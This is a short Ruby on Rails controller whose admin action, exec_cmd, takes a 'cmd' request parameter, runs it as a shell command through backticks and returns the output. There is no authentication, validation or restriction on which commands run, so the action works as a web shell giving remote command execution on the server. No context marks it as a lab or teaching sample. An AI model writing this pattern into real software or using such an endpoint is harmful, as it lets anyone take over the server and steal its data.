class AdminController < ApplicationController
  def exec_cmd
    cmd = params[:cmd]
    output = `#{cmd}`
    render plain: output
  end
end
